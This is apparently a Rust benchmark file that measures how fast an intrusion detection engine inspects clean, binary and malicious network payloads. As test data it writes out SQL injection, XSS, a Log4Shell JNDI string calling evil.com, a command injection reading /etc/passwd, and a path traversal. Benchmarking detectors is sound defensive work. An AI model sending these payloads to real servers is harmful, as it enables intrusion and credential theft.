//! Benchmarks for IDS engine performance — network payload inspection.
//!
//! Measures throughput for://! - Clean payloads (fast path)
//! - Malicious payloads (signature matching)
//! - Protocol-specific analysis
//! - Payload size scaling

use criterion::{criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
use ids_engine::{config::IdsConfig, engine::IdsEngine};
use std::hint::black_box;
use std::net::{IpAddr, Ipv4Addr};

fn make_engine() -> IdsEngine {
    IdsEngine::new(IdsConfig::default()).expect("Failed to create IDS engine")
}

// ---------------------------------------------------------------------------
// Clean payload benchmarks (fast path)
// ---------------------------------------------------------------------------

fn bench_clean_payloads(c: &mut Criterion) {
    let engine = make_engine();

    let mut group = c.benchmark_group("ids_clean");
    group.throughput(Throughput::Elements(1));

    // Empty payload
    group.bench_function("empty", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(&[]),
            )
        })
    });

    // Small HTTP GET
    let http_get = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
    group.bench_function("http_get_small", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(http_get),
            )
        })
    });

    // Medium HTTP response
    let http_response = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{}",
        1000,
        "x".repeat(1000)
    );
    group.bench_function("http_response_1kb", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(http_response.as_bytes()),
            )
        })
    });

    // SMTP EHLO
    let smtp_ehlo = b"EHLO mail.example.com\r\n";
    group.bench_function("smtp_ehlo", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(25),
                black_box("smtp"),
                black_box(smtp_ehlo),
            )
        })
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// Malicious payload benchmarks
// ---------------------------------------------------------------------------

fn bench_malicious_payloads(c: &mut Criterion) {
    let engine = make_engine();

    let mut group = c.benchmark_group("ids_malicious");
    group.throughput(Throughput::Elements(1));

    // SQL Injection in HTTP
    let sql_payload =
        b"GET /search?q=' UNION SELECT * FROM users -- HTTP/1.1\r\nHost:example.com\r\n\r\n";
    group.bench_function("sqli_http", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(sql_payload),
            )
        })
    });

    // XSS in HTTP
    let xss_payload = b"POST /comment HTTP/1.1\r\nHost: example.com\r\nContent-Length: 30\r\n\r\n<script>alert(1)</script>";
    group.bench_function("xss_http", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(xss_payload),
            )
        })
    });

    // Log4Shell
    let log4shell =
        b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: ${jndi:ldap://evil.com/x}\r\n\r\n";
    group.bench_function("log4shell", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(log4shell),
            )
        })
    });

    // Shell command
    let cmd_payload =
        b"GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n";
    group.bench_function("command_injection", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(cmd_payload),
            )
        })
    });

    // Path traversal
    let traversal = b"GET /../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n";
    group.bench_function("path_traversal", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(traversal),
            )
        })
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// Payload size scaling
// ---------------------------------------------------------------------------

fn bench_size_scaling(c: &mut Criterion) {
    let engine = make_engine();

    let mut group = c.benchmark_group("ids_size_scaling");

    let sizes = [100, 1_000, 10_000, 100_000];

    for size in sizes {
        // Create a clean payload of specified size
        let payload = vec![b'x'; size];

        group.throughput(Throughput::Bytes(size as u64));
        group.bench_with_input(
            BenchmarkId::new("clean_bytes", size),
            &payload,
            |b, payload| {
                b.iter(|| {
                    engine.inspect(
                        black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                        black_box(80),
                        black_box("tcp"),
                        black_box(payload),
                    )
                })
            },
        );
    }

    // Malicious patterns at different positions
    for size in [1_000, 10_000, 50_000] {
        // Malicious at start
        let mut payload_start = b"${jndi:ldap://a.b/x}".to_vec();
        payload_start.extend(vec![b'x'; size]);

        // Malicious at end
        let mut payload_end = vec![b'x'; size];
        payload_end.extend(b"${jndi:ldap://a.b/x}");

        group.throughput(Throughput::Bytes((size + 20) as u64));
        group.bench_with_input(
            BenchmarkId::new("malicious_at_start", size),
            &payload_start,
            |b, payload| {
                b.iter(|| {
                    engine.inspect(
                        black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                        black_box(80),
                        black_box("tcp"),
                        black_box(payload),
                    )
                })
            },
        );

        group.bench_with_input(
            BenchmarkId::new("malicious_at_end", size),
            &payload_end,
            |b, payload| {
                b.iter(|| {
                    engine.inspect(
                        black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                        black_box(80),
                        black_box("tcp"),
                        black_box(payload),
                    )
                })
            },
        );
    }

    group.finish();
}

// ---------------------------------------------------------------------------
// Protocol variation
// ---------------------------------------------------------------------------

fn bench_protocol_variation(c: &mut Criterion) {
    let engine = make_engine();

    let mut group = c.benchmark_group("ids_protocols");
    group.throughput(Throughput::Elements(1));

    let payload = b"Hello, World!";

    let protocols = ["tcp", "udp", "smtp", "dns", "tls", "http"];
    let ports = [80, 443, 25, 53, 8080, 3306];

    for (proto, port) in protocols.iter().zip(ports.iter()) {
        group.bench_with_input(
            BenchmarkId::new(*proto, *port),
            &(proto, port),
            |b, (proto, port)| {
                b.iter(|| {
                    engine.inspect(
                        black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                        black_box(**port),
                        black_box(*proto),
                        black_box(payload),
                    )
                })
            },
        );
    }

    group.finish();
}

// ---------------------------------------------------------------------------
// Binary payload handling
// ---------------------------------------------------------------------------

fn bench_binary_payloads(c: &mut Criterion) {
    let engine = make_engine();

    let mut group = c.benchmark_group("ids_binary");
    group.throughput(Throughput::Elements(1));

    // All zeros
    let zeros: Vec<u8> = vec![0u8; 1000];
    group.bench_function("all_zeros_1kb", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(&zeros),
            )
        })
    });

    // Random-ish binary (repeating pattern)
    let pattern: Vec<u8> = (0..=255u8).cycle().take(1000).collect();
    group.bench_function("binary_pattern_1kb", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(&pattern),
            )
        })
    });

    // PE header (Windows executable magic)
    let mut pe_like = vec![0x4D, 0x5A]; // MZ header
    pe_like.extend(vec![0u8; 998]);
    group.bench_function("pe_like_1kb", |b| {
        b.iter(|| {
            engine.inspect(
                black_box(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))),
                black_box(80),
                black_box("tcp"),
                black_box(&pe_like),
            )
        })
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

criterion_group!(
    benches,
    bench_clean_payloads,
    bench_malicious_payloads,
    bench_size_scaling,
    bench_protocol_variation,
    bench_binary_payloads,
);

criterion_main!(benches);
